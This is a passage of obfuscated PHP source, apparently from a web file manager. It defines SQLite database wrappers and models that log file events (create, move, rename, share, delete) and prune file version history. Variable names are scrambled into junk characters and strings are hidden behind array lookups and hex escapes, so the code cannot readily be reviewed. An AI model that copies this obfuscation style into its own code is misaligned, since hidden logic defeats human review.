(!$this->linkID[$é¶¿ĞÆÉ]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$é¶¿ĞÆÉ], 30000); if (1 != think_config($Æ™ÉõÛ‚[22])) { unset($this->config); } } return $this->linkID[$é¶¿ĞÆÉ]; } public function free() { $this->queryID = null; } public function query($ æàö¢) { $­³ÃÙÍí =& $_SERVER[™¸œØ®Ü]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ æàö¢; if ($this->queryID) { $this->free(); } think_action_status($­³ÃÙÍí[23], 1); think_status($­³ÃÙÍí[24]); $this->queryID = sqlite_query($this->_linkID, $ æàö¢); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $™ç­•œÇ = $this->getAll(); return $™ç­•œÇ; } } public function execute($–ó¥•ô’) { $›’º„»œ =& $_SERVER[™¸œØ®Ü]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $–ó¥•ô’; if ($this->queryID) { $this->free(); } think_action_status($›’º„»œ[25], 1); think_status($›’º„»œ[24]); $Š¡Ğ­ì = sqlite_exec($this->_linkID, $–ó¥•ô’); $this->debug(); if (!1 === $Š¡Ğ­ì) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[™¸œØ®Ü][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ø¿Šçº” = sqlite_query($this->_linkID, $_SERVER[™¸œØ®Ü][27]); if (!$ø¿Šçº”) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÌÅé¤ñø = sqlite_query($this->_linkID, $_SERVER[™¸œØ®Ü][28]); if (!$ÌÅé¤ñø) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ë’÷ßÜÒ = array(); if ($this->numRows > 0) { for ($Û„» Ù = 0; $Û„» Ù < $this->numRows; $Û„» Ù++) { $ë’÷ßÜÒ[$Û„» Ù] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ë’÷ßÜÒ; } public function getFields($Óø…‡Ø) { $®İÅ½°Ó =& $_SERVER[™¸œØ®Ü]; $¨¥ß†˜µ = $this->query($®İÅ½°Ó[29] . $Óø…‡Ø . $®İÅ½°Ó[30]); $Îú‰Æ“ = array(); if ($¨¥ß†˜µ) { foreach ($¨¥ß†˜µ as $“Ã•õ¢Á => $ÖşÇËˆÄ) { $Îú‰Æ“[$ÖşÇËˆÄ[$®İÅ½°Ó[31]]] = array($®İÅ½°Ó[32] => $ÖşÇËˆÄ[$®İÅ½°Ó[31]], $®İÅ½°Ó[33] => $ÖşÇËˆÄ[$®İÅ½°Ó[34]], $®İÅ½°Ó[35] => (bool) ($ÖşÇËˆÄ[$®İÅ½°Ó[36]] === $®İÅ½°Ó[12]), $®İÅ½°Ó[37] => $ÖşÇËˆÄ[$®İÅ½°Ó[38]], $®İÅ½°Ó[39] => strtolower($ÖşÇËˆÄ[$®İÅ½°Ó[40]]) == $®İÅ½°Ó[41], $®İÅ½°Ó[42] => strtolower($ÖşÇËˆÄ[$®İÅ½°Ó[43]]) == $®İÅ½°Ó[44]); } } return $Îú‰Æ“; } public function getTables($¨ãÑ¼é = '') { $£ÖñŞÒÍ =& $_SERVER[™¸œØ®Ü]; $›¥æ·‡ = $this->query($£ÖñŞÒÍ[45] . $£ÖñŞÒÍ[46] . $£ÖñŞÒÍ[47]); $±‚§İ¾ = array(); foreach ($›¥æ·‡ as $µú›·€ => $Ñ©•å°Ş) { $±‚§İ¾[$µú›·€] = current($Ñ©•å°Ş); } return $±‚§İ¾; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $‘Úşè…¼ =& $_SERVER[™¸œØ®Ü]; $¯É—ò˜Í = sqlite_last_error($this->_linkID); $this->error = $¯É—ò˜Í . $‘Úşè…¼[4] . sqlite_error_string($¯É—ò˜Í); if ($‘Úşè…¼[12] != $this->queryStr) { $this->error .= LNG($‘Úşè…¼[48]) . $this->queryStr; } think_trace($this->error, $‘Úşè…¼[12], $‘Úşè…¼[49]); return $this->error; } public function escapeString($Ï–»ı¨Ã) { return sqlite_escape_string($Ï–»ı¨Ã); } public function parseLimit($•æñÄ…ú) { $ïç×€á =& $_SERVER[™¸œØ®Ü]; $İ‚ú—İ¶ = $ïç×€á[12]; if (!empty($•æñÄ…ú)) { $•æñÄ…ú = explode($ïç×€á[50], $•æñÄ…ú); if (count($•æñÄ…ú) > 1) { $İ‚ú—İ¶ .= $ïç×€á[51] . $•æñÄ…ú[1] . $ïç×€á[52] . $•æñÄ…ú[0] . $ïç×€á[53]; } else { $İ‚ú—İ¶ .= $ïç×€á[51] . $•æñÄ…ú[0] . $ïç×€á[53]; } } return $İ‚ú—İ¶; } } class DbSqlite3Base extends Db { public function __construct($ãÕÎ‚Å† = '') { $­­ã©¥© =& $_SERVER[™¸œØ®Ü]; if (!class_exists($­­ã©¥©[54])) { think_exception(think_lang($­­ã©¥©[14]) . $­­ã©¥©[55]); } if (!empty($ãÕÎ‚Å†)) { if (!isset($ãÕÎ‚Å†[$­­ã©¥©[16]])) { $ãÕÎ‚Å†[$­­ã©¥©[16]] = 438; } $this->config = $ãÕÎ‚Å†; if (empty($this->config[$­­ã©¥©[17]])) { $this->config[$­­ã©¥©[17]] = array(); } } } public function connect($‹îÛÛàÜ = '', $ÓêÄûÇÃ = 0) { $íñ³ï«Û =& $_SERVER[™¸œØ®Ü]; if (!isset($this->linkID[$ÓêÄûÇÃ])) { if (empty($‹îÛÛàÜ)) { $‹îÛÛàÜ = $this->config; } $this->linkID[$ÓêÄûÇÃ] = new SQLite3($‹îÛÛàÜ[$íñ³ï«Û[21]]); if (!$this->linkID[$ÓêÄûÇÃ]) { think_exception($this->linkID[$ÓêÄûÇÃ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ÓêÄûÇÃ]->busyTimeout(30000); if (1 != think_config($íñ³ï«Û[22])) { unset($this->config); } } return $this->linkID[$ÓêÄûÇÃ]; } public function free() { $this->queryID = null; } public function query($²µÌ¦ñ) { $Í¢¤İÂ =& $_SERVER[™¸œØ®Ü]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $²µÌ¦ñ; if ($this->queryID) { $this->free(); } think_action_status($Í¢¤İÂ[23], 1); think_status($Í¢¤İÂ[24]); $this->queryID = $this->_linkID->query($²µÌ¦ñ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $Ñ€ëá¢ = $this->getAll(); $this->numRows = count($Ñ€ëá¢); return $Ñ€ëá¢; } } public function execute($¬Ãø–‘) { $£ÌşÂ µ =& $_SERVER[™¸œØ®Ü]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¬Ãø–‘; if ($this->queryID) { $this->free(); } think_action_status($£ÌşÂ µ[25], 1); think_status($£ÌşÂ µ[24]); $Ê‚ØâÁ = $this->_linkID->exec($¬Ãø–‘); $this->debug(); if (!1 === $Ê‚ØâÁ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[™¸œØ®Ü][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ŸÕ¬†’ö = $this->_linkID->query($_SERVER[™¸œØ®Ü][27]); if (!$ŸÕ¬†’ö) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¹óŸ·™’ = $this->_linkID->query($_SERVER[™¸œØ®Ü][28]); if (!$¹óŸ·™’) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $óêŒ˜ğø = array(); while ($°ÑØú ’ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $óêŒ˜ğø[] = $°ÑØú ’; } $this->queryID->reset(); return $óêŒ˜ğø; } public function getFields($ˆ‹¯›ç) { $€«é¶êã =& $_SERVER[™¸œØ®Ü]; $†Ó¿òÀÀ = $this->query($€«é¶êã[29] . $ˆ‹¯›ç . $€«é¶êã[30]); $ÜÆ·ŒÄ = array(); if ($†Ó¿òÀÀ) { foreach ($†Ó¿òÀÀ as $£üõ÷ => $ğ®Öççô) { $ÜÆ·ŒÄ[$ğ®Öççô[$€«é¶êã[32]]] = array($€«é¶êã[32] => $ğ®Öççô[$€«é¶êã[32]], $€«é¶êã[33] => $ğ®Öççô[$€«é¶êã[33]], $€«é¶êã[35] => (bool) ($ğ®Öççô[$€«é¶êã[35]] === $€«é¶êã[12]), $€«é¶êã[37] => $ğ®Öççô[$€«é¶êã[56]], $€«é¶êã[39] => (bool) $ğ®Öççô[$€«é¶êã[57]], $€«é¶êã[42] => (bool) $ğ®Öççô[$€«é¶êã[57]]); } } return $ÜÆ·ŒÄ; } public function getTables($èÒ÷îù› = '') { $…™‚ßŒ¼ =& $_SERVER[™¸œØ®Ü]; $œä˜‚Û» = $this->query($…™‚ßŒ¼[45] . $…™‚ßŒ¼[46] . $…™‚ßŒ¼[47]); $¡õŸï¡Ÿ = array(); foreach ($œä˜‚Û» as $¯ûÌŞ÷ => $Ÿ€‰‘–) { $¡õŸï¡Ÿ[$¯ûÌŞ÷] = current($Ÿ€‰‘–); } return $¡õŸï¡Ÿ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¥°ôè·ş =& $_SERVER[™¸œØ®Ü]; $this->error = $this->_linkID->lastErrorMsg(); if ($¥°ôè·ş[12] != $this->queryStr) { $this->error .= LNG($¥°ôè·ş[48]) . $this->queryStr; } think_trace($this->error, $¥°ôè·ş[12], $¥°ôè·ş[49]); return $this->error; } public function escapeString($˜í´¹ÂÉ) { $®îÓı€î =& $_SERVER[™¸œØ®Ü]; if ($this->_linkID) { return $this->_linkID->escapeString($˜í´¹ÂÉ); } return str_ireplace($®îÓı€î[58], $®îÓı€î[59], $˜í´¹ÂÉ); } public function parseLimit($°—¶ÔÛ) { $™ŸÖÇ¯‹ =& $_SERVER[™¸œØ®Ü]; $Ä˜”¼ï = $™ŸÖÇ¯‹[12]; if (!empty($°—¶ÔÛ)) { $°—¶ÔÛ = explode($™ŸÖÇ¯‹[50], $°—¶ÔÛ); if (count($°—¶ÔÛ) > 1) { $Ä˜”¼ï .= $™ŸÖÇ¯‹[51] . $°—¶ÔÛ[1] . $™ŸÖÇ¯‹[52] . $°—¶ÔÛ[0] . $™ŸÖÇ¯‹[53]; } else { $Ä˜”¼ï .= $™ŸÖÇ¯‹[51] . $°—¶ÔÛ[0] . $™ŸÖÇ¯‹[53]; } } return $Ä˜”¼ï; } } goto EÁ·ÓÖ‡¯; cĞ•˜‡Ñªó: class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\165\x72\143\145\x5f\145\166\x65\156\x74"; protected $dataAuto = array(array("\143\x72\x65\x61\x74\145\x54\151\x6d\145", "\164\x69\x6d\x65", "\x69\156\x73\145\x72\164", "\146\165\x6e\143\164\x69\x6f\156"), array("\x64\x65\163\x63", '', "\151\x6e\163\x65\x72\x74\x2c\x75\x70\x64\141\x74\x65\x2c\163\x65\154\145\143\164", "\152\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($—üÛ²ô, $æÙå½«í, $—«ÇîµÒ = '') { $°Ú¦Šµ =& $_SERVER[™¸œØ®Ü]; if (!$this->eventSave) { return; } $Ê¤ï•Â˜ = Model($°Ú¦Šµ[1440])->sourceInfo($—üÛ²ô); if (!$Ê¤ï•Â˜) { return !1; } if ($this->isDisableEvent($Ê¤ï•Â˜, $æÙå½«í)) { return; } if ($—«ÇîµÒ && is_string($—«ÇîµÒ)) { $—«ÇîµÒ = array($°Ú¦Šµ[2035] => $—«ÇîµÒ); } $äƒ¥ø¿Ä = defined($°Ú¦Šµ[2226]) ? USER_ID : 0; $×„¤Õ  = array($°Ú¦Šµ[493] => $—üÛ²ô, $°Ú¦Šµ[2227] => $Ê¤ï•Â˜[$°Ú¦Šµ[192]], $°Ú¦Šµ[2228] => $Ê¤ï•Â˜[$°Ú¦Šµ[32]], $°Ú¦Šµ[586] => !empty($Ê¤ï•Â˜[$°Ú¦Šµ[586]]) ? $Ê¤ï•Â˜[$°Ú¦Šµ[586]] : $°Ú¦Šµ[12], $°Ú¦Šµ[1786] => $äƒ¥ø¿Ä, $°Ú¦Šµ[498] => $æÙå½«í, $°Ú¦Šµ[1788] => $—«ÇîµÒ); $this->addSystemLog($æÙå½«í, $×„¤Õ ); unset($×„¤Õ [$°Ú¦Šµ[2228]], $×„¤Õ [$°Ú¦Šµ[586]]); return $this->add($×„¤Õ ); } private function addSystemLog($Â ù´¬°, $ÊÉ©™êİ) { $¦ıíñ¨ˆ =& $_SERVER[™¸œØ®Ü]; if ($Â ù´¬° == $¦ıíñ¨ˆ[2229]) { $Â ù´¬° = $ÊÉ©™êİ[$¦ıíñ¨ˆ[528]][$¦ıíñ¨ˆ[2230]]; } else { if (in_array($Â ù´¬°, array($¦ıíñ¨ˆ[1975], $¦ıíñ¨ˆ[2231]))) { $Â ù´¬° = $ÊÉ©™êİ[$¦ıíñ¨ˆ[528]][$¦ıíñ¨ˆ[171]]; } } $í–à»Û¨ = array_merge($ÊÉ©™êİ, array($¦ıíñ¨ˆ[2232] => $ÊÉ©™êİ[$¦ıíñ¨ˆ[193]], $¦ıíñ¨ˆ[2233] => $ÊÉ©™êİ[$¦ıíñ¨ˆ[2233]])); Hook::trigger($¦ıíñ¨ˆ[2234], $¦ıíñ¨ˆ[2235] . $Â ù´¬°, $ÊÉ©™êİ); Model($¦ıíñ¨ˆ[1939])->addLog($¦ıíñ¨ˆ[2235] . $Â ù´¬°, $í–à»Û¨); } private function isDisableEvent($»Í©õı, $ÉÙó‡»Æ) { $¥¶É»ø =& $_SERVER[™¸œØ®Ü]; if ($»Í©õı[$¥¶É»ø[190]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($ÉÙó‡»Æ == $¥¶É»ø[1964]) { return !1; } return !0; } public function eventCreate($µá‚ê, $í„šú¥) { $´§¯ûœÉ =& $_SERVER[™¸œØ®Ü]; $—ŸÔÇùƒ = Model($´§¯ûœÉ[1440])->sourceInfo($µá‚ê); $ƒë¾ ß¸ = array($´§¯ûœÉ[2230] => $í„šú¥, $´§¯ûœÉ[32] => $—ŸÔÇùƒ[$´§¯ûœÉ[32]]); return $this->addEvent($µá‚ê, $´§¯ûœÉ[2229], $ƒë¾ ß¸); } public function eventFileEdit($ù¼º®îğ) { $µêé¢˜ı =& $_SERVER[™¸œØ®Ü]; $é†–… = array($µêé¢˜ı[2236] => $_SERVER[$µêé¢˜ı[2237]], $µêé¢˜ı[2238] => strtolower(ACTION)); if (isset($GLOBALS[$µêé¢˜ı[7]][$µêé¢˜ı[2239]])) { $é†–…[$µêé¢˜ı[2239]] = $µêé¢˜ı[91]; } return $this->addEvent($ù¼º®îğ, $µêé¢˜ı[1965], $é†–…); } public function eventRecycle($à¬ƒİ°, $Ú¥¡¾“¬) { return $this->addEvent($à¬ƒİ°, $_SERVER[™¸œØ®Ü][2231], $Ú¥¡¾“¬); } private static $_removeLast = ''; public function eventRemove($Ôõèƒà”) { $—À„öœ´ =& $_SERVER[™¸œØ®Ü]; self::$_removeLast = $Ôõèƒà”; $œŸåÁ‰û = Model($—À„öœ´[1440])->sourceInfo($Ôõèƒà”); $ÏŒ‰ôî™ = array_field_key($œŸåÁ‰û, array($—À„öœ´[193], $—À„öœ´[545], $—À„öœ´[507], $—À„öœ´[588])); $¶¤°¾› = array($—À„öœ´[171] => $œŸåÁ‰û[$—À„öœ´[32]], $—À„öœ´[2238] => ACTION, $—À„öœ´[2240] => $ÏŒ‰ôî™); return $this->addEvent($œŸåÁ‰û[$—À„öœ´[192]], $—À„öœ´[1964], $¶¤°¾›); } public function eventShare($àÊî•Í, $§³¡øÚ‰) { return $this->addEvent($àÊî•Í, $_SERVER[™¸œØ®Ü][1975], $§³¡øÚ‰); } public function eventMove($¬¯ÕÂ‘÷, $´øı ¶, $¾Ç¥ïóá) { $µ²šÜÅø =& $_SERVER[™¸œØ®Ü]; if (self::$_removeLast == $¬¯ÕÂ‘÷) { return; } $“Úğ€¬ğ = Model($µ²šÜÅø[1440]); $²•§€™ƒ = $“Úğ€¬ğ->sourceInfo($¬¯ÕÂ‘÷); $ä›£ıÉÈ = $“Úğ€¬ğ->sourceInfo($´øı ¶); $Üëú—Ÿ = $“Úğ€¬ğ->sourceInfo($¾Ç¥ïóá); $µ¯óå¾Ğ = array($µ²šÜÅø[1260] => $´øı ¶, $µ²šÜÅø[2241] => $ä›£ıÉÈ[$µ²šÜÅø[32]], $µ²šÜÅø[2217] => !empty($ä›£ıÉÈ[$µ²šÜÅø[586]]) ? $ä›£ıÉÈ[$µ²šÜÅø[586]] : $µ²šÜÅø[12], $µ²šÜÅø[1261] => $¾Ç¥ïóá, $µ²šÜÅø[2242] => $Üëú—Ÿ[$µ²šÜÅø[32]], $µ²šÜÅø[2243] => !empty($Üëú—Ÿ[$µ²šÜÅø[586]]) ? $Üëú—Ÿ[$µ²šÜÅø[586]] : $µ²šÜÅø[12]); $this->addEvent($¬¯ÕÂ‘÷, $µ²šÜÅø[627], $µ¯óå¾Ğ); $²•§€™ƒ = $“Úğ€¬ğ->sourceInfo($¬¯ÕÂ‘÷); $µ¯óå¾Ğ = array($µ²šÜÅø[193] => $²•§€™ƒ[$µ²šÜÅø[193]], $µ²šÜÅø[32] => $²•§€™ƒ[$µ²šÜÅø[32]]); $this->addEvent($´øı ¶, $µ²šÜÅø[2244], $µ¯óå¾Ğ); } public function eventCopy($ìôÉõÁƒ) { $this->eventCreate($ìôÉõÁƒ, $_SERVER[™¸œØ®Ü][625]); } public function eventRename($“ûùÅ–æ, $ãĞ¤úÀØ, $†Ÿ€ÇØì) { $‘ù«ÎÍ =& $_SERVER[™¸œØ®Ü]; $¹·­–Ë¸ = array($‘ù«ÎÍ[1260] => $ãĞ¤úÀØ, $‘ù«ÎÍ[1261] => $†Ÿ€ÇØì); return $this->addEvent($“ûùÅ–æ, $‘ù«ÎÍ[1454], $¹·­–Ë¸); } public function eventAddComment($““µ”š“, $šûúÄã) { return $this->addEvent($““µ”š“, $_SERVER[™¸œØ®Ü][2245], $šûúÄã); } public function eventAddDesc($äû»”®, $ûÃÔ¹¯Ú) { return $this->addEvent($äû»”®, $_SERVER[™¸œØ®Ü][2246], $ûÃÔ¹¯Ú); } public function listBySource($°Ÿó¸‰) { $­ËÈª¹ =& $_SERVER[™¸œØ®Ü]; $Ãª—°Î’ = Model($­ËÈª¹[1440])->sourceInfo($°Ÿó¸‰); $Óï…Û´Ñ = array($­ËÈª¹[493] => $°Ÿó¸‰); if ($Ãª—°Î’[$­ËÈª¹[487]] == $­ËÈª¹[91]) { $ĞØ©ô‹Ú = Model($­ËÈª¹[1440])->listSearchChildren($°Ÿó¸‰, 20000); $ĞØ©ô‹Ú[] = $°Ÿó¸‰ . $­ËÈª¹[456]; $Óï…Û´Ñ = array($­ËÈª¹[193] => array($­ËÈª¹[7], $ĞØ©ô‹Ú)); } $ºª’Íì = $this->where($Óï…Û´Ñ)->order($­ËÈª¹[2247])->selectPage(); if ($ºª’Íì[$­ËÈª¹[444]][$­ËÈª¹[445]] == 0) { $ºª’Íì[$­ËÈª¹[444]][$­ËÈª¹[445]] = 1; $ºª’Íì[$­ËÈª¹[447]] = array(array($­ËÈª¹[493] => $°Ÿó¸‰, $­ËÈª¹[2227] => $Ãª—°Î’[$­ËÈª¹[192]], $­ËÈª¹[1786] => $Ãª—°Î’[$­ËÈª¹[529]], $­ËÈª¹[498] => $­ËÈª¹[2248], $­ËÈª¹[499] => $Ãª—°Î’[$­ËÈª¹[233]], $­ËÈª¹[1788] => $­ËÈª¹[12])); } return $this->eventListParse($ºª’Íì, $°Ÿó¸‰); } private function eventListParse($•×Øæ, $€“ô«•Ï) { $µ®«¿ã =& $_SERVER[™¸œØ®Ü]; $¬’„¾¡ô = $•×Øæ[$µ®«¿ã[447]]; $×Ö¸„¡Î = array_to_keyvalue($¬’„¾¡ô, $µ®«¿ã[12], $µ®«¿ã[193]); $·ãÁ³÷ = array_to_keyvalue($¬’„¾¡ô, $µ®«¿ã[12], $µ®«¿ã[2233]); foreach ($¬’„¾¡ô as $Ùˆãé÷Æ) { $Ï¬–§Í = $Ùˆãé÷Æ[$µ®«¿ã[528]]; if ($Ùˆãé÷Æ[$µ®«¿ã[33]] == $µ®«¿ã[627] && isset($Ï¬–§Í[$µ®«¿ã[1260]])) { $×Ö¸„¡Î[] = $Ï¬–§Í[$µ®«¿ã[1260]] . $µ®«¿ã[12]; $×Ö¸„¡Î[] = $Ï¬–§Í[$µ®«¿ã[1261]] . $µ®«¿ã[12]; } if ($Ùˆãé÷Æ[$µ®«¿ã[33]] == $µ®«¿ã[2244] && isset($Ï¬–§Í[$µ®«¿ã[193]])) { $×Ö¸„¡Î[] = $Ï¬–§Í[$µ®«¿ã[193]] . $µ®«¿ã[12]; } } $×Ö¸„¡Î = array_merge($×Ö¸„¡Î, $·ãÁ³÷, array($€“ô«•Ï . $µ®«¿ã[12])); $×Ö¸„¡Î = array_unique($×Ö¸„¡Î); $¶Íœå˜ = array_unique(array_to_keyvalue($¬’„¾¡ô, $µ®«¿ã[12], $µ®«¿ã[1795])); $µ’“Ö‰ñ = Model($µ®«¿ã[601])->userListInfo($¶Íœå˜); $ÃÓù”Ùã = Model($µ®«¿ã[915])->sourceListInfo($×Ö¸„¡Î, !0); foreach ($¬’„¾¡ô as &$Ùˆãé÷Æ) { if ($Ùˆãé÷Æ[$µ®«¿ã[33]] == $µ®«¿ã[627] && isset($Ùˆãé÷Æ[$µ®«¿ã[528]][$µ®«¿ã[1260]])) { $Ùˆãé÷Æ[$µ®«¿ã[528]][$µ®«¿ã[1260]] = $ÃÓù”Ùã[$Ùˆãé÷Æ[$µ®«¿ã[528]][$µ®«¿ã[1260]]]; $Ùˆãé÷Æ[$µ®«¿ã[528]][$µ®«¿ã[1261]] = $ÃÓù”Ùã[$Ùˆãé÷Æ[$µ®«¿ã[528]][$µ®«¿ã[1261]]]; } if ($Ùˆãé÷Æ[$µ®«¿ã[33]] == $µ®«¿ã[2244] && isset($Ùˆãé÷Æ[$µ®«¿ã[528]][$µ®«¿ã[193]])) { $Ùˆãé÷Æ[$µ®«¿ã[528]][$µ®«¿ã[193]] = $ÃÓù”Ùã[$Ùˆãé÷Æ[$µ®«¿ã[528]][$µ®«¿ã[193]]]; } $Ùˆãé÷Æ[$µ®«¿ã[90]] = $ÃÓù”Ùã[$Ùˆãé÷Æ[$µ®«¿ã[193]]]; $Ùˆãé÷Æ[$µ®«¿ã[2249]] = $ÃÓù”Ùã[$Ùˆãé÷Æ[$µ®«¿ã[2233]]]; if ($Ùˆãé÷Æ[$µ®«¿ã[33]] == $µ®«¿ã[1964]) { $Ùˆãé÷Æ[$µ®«¿ã[2249]] = $Ùˆãé÷Æ[$µ®«¿ã[90]]; $Ùˆãé÷Æ[$µ®«¿ã[2233]] = $Ùˆãé÷Æ[$µ®«¿ã[2249]][$µ®«¿ã[193]]; $Ùˆãé÷Æ[$µ®«¿ã[90]] = !1; $Ùˆãé÷Æ[$µ®«¿ã[193]] = $µ®«¿ã[12]; } $Ùˆãé÷Æ[$µ®«¿ã[2176]] = $µ’“Ö‰ñ[$Ùˆãé÷Æ[$µ®«¿ã[1795]]]; } unset($Ùˆãé÷Æ); $•×Øæ[$µ®«¿ã[447]] = $¬’„¾¡ô; return $•×Øæ; } public function removeBySource($Ôçò‹Ş) { $çê¿™Ê = array($_SERVER[™¸œØ®Ü][493] => $Ôçò‹Ş); $this->where($çê¿™Ê)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\x75\162\x63\145\x5f\x68\151\x73\x74\x6f\x72\171"; public function historyCount($û¼”—Ó) { $ºå×›œ± =& $_SERVER[™¸œØ®Ü]; if (!$û¼”—Ó) { return array(); } if (is_string($û¼”—Ó) || is_int($û¼”—Ó)) { $û¼”—Ó = array($û¼”—Ó); } $´«ö«ÀÃ = array($ºå×›œ±[193], $ºå×›œ±[2250] => $ºå×›œ±[569]); $Àû€Æãğ = array($ºå×›œ±[193] => array($ºå×›œ±[7], $û¼”—Ó)); $àáÑ¾Ó = $this->field($´«ö«ÀÃ)->where($Àû€Æãğ)->group($ºå×›œ±[193])->select(); return array_to_keyvalue($àáÑ¾Ó, $ºå×›œ±[193], $ºå×›œ±[569]); } public function addHistory($™ÉÌ†¹, $öè«ŒÖÔ = '') { $Âä…Ìšä =& $_SERVER[™¸œØ®Ü]; $½‰¯æÓÛ = array($Âä…Ìšä[493] => $™ÉÌ†¹[$Âä…Ìšä[193]], $Âä…Ìšä[1786] => isset($™ÉÌ†¹[$Âä…Ìšä[531]]) ? $™ÉÌ†¹[$Âä…Ìšä[531]] : $™ÉÌ†¹[$Âä…Ìšä[529]], $Âä…Ìšä[546] => $™ÉÌ†¹[$Âä…Ìšä[545]], $Âä…Ìšä[624] => $™ÉÌ†¹[$Âä…Ìšä[79]], $Âä…Ìšä[2251] => $öè«ŒÖÔ); if ($GLOBALS[$Âä…Ìšä[6]][$Âä…Ìšä[92]][$Âä…Ìšä[1321]] >= 1) { $this->historyAutoClear($½‰¯æÓÛ[$Âä…Ìšä[193]]); $this->add($½‰¯æÓÛ); } Hook::trigger($Âä…Ìšä[2252], $½‰¯æÓÛ); Model($Âä…Ìšä[2253])->eventFileEdit($™ÉÌ†¹[$Âä…Ìšä[193]]); } private function historyAutoClear($Óò§Á²Ÿ) { $Ø­çúŒ =& $_SERVER[™¸œØ®Ü]; $¿ò•±¡è = Model($Ø­çúŒ[855])->get($Ø­çúŒ[1343]); $ãƒ—™÷Ÿ = intval($GLOBALS[$Ø­çúŒ[6]][$Ø­çúŒ[92]][$Ø­çúŒ[1321]]); $Ê»ä¥Í‚ = $¿ò•±¡è == $Ø­çúŒ[1344] ? min(5, $ãƒ—™÷Ÿ) : $ãƒ—™÷Ÿ; $Ê»ä¥Í‚ = $Ê»ä¥Í‚ <= 0 ? 0 : $Ê»ä¥Í‚ - 1; if ($Ê»ä¥Í‚ >= 499) { return; } $ÊÃØ¯²  = array($Ø­çúŒ[493] => $Óò§Á²Ÿ); $¤Œã¨ÕÌ = $this->field($Ø­çúŒ[2254])->where($ÊÃØ¯² )->order($Ø­çúŒ[2247])->select(); if (!$¤Œã¨ÕÌ || $Ê»ä¥Í‚ >= count($¤Œã¨ÕÌ)) { return; } $õÓÛ¬ç± = array_to_keyvalue($¤Œã¨ÕÌ, $Ø­çúŒ[12], $Ø­çúŒ[477]); $õÓÛ¬ç± = array_slice($õÓÛ¬ç±, $Ê»ä¥Í‚); $ÅõšëÚï = array_to_keyvalue($¤Œã¨ÕÌ, $Ø­çúŒ[12], $Ø­çúŒ[545]); $ÅõšëÚï = array_slice($ÅõšëÚï, $Ê»ä¥Í‚); if (!$õÓÛ¬ç± || !$ÅõšëÚï) { return; } $ÊÃØ¯²  = array($Ø­çúŒ[495] => array($Ø­çúŒ[7], $õÓÛ¬ç±)); $this->where($ÊÃØ¯² )->delete(); Model($Ø­çúŒ[548])->remove($ÅõšëÚï); } public function listData($û‘ˆÔîø) { $æÄ²¢”´ =& $_SERVER[™¸œØ®Ü]; $®Üˆ“Ø‹ = array($æÄ²¢”´[493] => $û‘ˆÔîø); $¢ı­é÷’ = $æÄ²¢”´[2255]; $Û¬ÙÀ¥¬ = $this->field($¢ı­é÷’)->where($®Üˆ“Ø‹)->order($æÄ²¢”´[2247])->selectPage(); $this->_listAppendUser($Û¬ÙÀ¥¬[$æÄ²¢”´[447]]); $¶ñ‘¼Êğ = Model($æÄ²¢”´[855])->get($æÄ²¢”´[1343]); $ù–âŞ‚ß = 5; if ($¶ñ‘¼Êğ == $æÄ²¢”´[1344]) { $Û¬ÙÀ¥¬[$æÄ²¢”´[447]] = array_slice($Û¬ÙÀ¥¬[$æÄ²¢”´[447]], 0, $ù–âŞ‚ß); $Û¬ÙÀ¥¬[$æÄ²¢”´[444]] = array($æÄ²¢”´[2256] => 1, $æÄ²¢”´[2257] => 20, $æÄ²¢”´[2258] => 1, $æÄ²¢”´[2259] => count($Û¬ÙÀ¥¬[$æÄ²¢”´[447]])); } return $Û¬ÙÀ¥¬; } protected function _listAppendUser(&$¤÷î·ÌÚ) { $ñì›—ªÜ =& $_SERVER[™¸œØ®Ü]; $¶Şíï² = array_to_keyvalue($¤÷î·ÌÚ, $ñì›—ªÜ[12], $ñì›—ªÜ[1795]); $åâŸƒ = Model($ñì›—ªÜ[601])->userListInfo($¶Şíï²); foreach ($¤÷î·ÌÚ as &$ÔÇ´êá›) { $ûû§ŸÓÃ = $ÔÇ´êá›[$ñì›—ªÜ[1795]]; $ÔÇ´êá›[$ñì›—ªÜ[529]] = $åâŸƒ[$ûû§ŸÓÃ] ? $åâŸƒ[$ûû§ŸÓÃ] : !1; } unset($ÔÇ´êá›); } public function fileInfo($Üìë’”) { $Ë°¦õ· =& $_SERVER[™¸œØ®Ü]; $àà¤·øí = $this->tablePrefix; $˜©·ã = 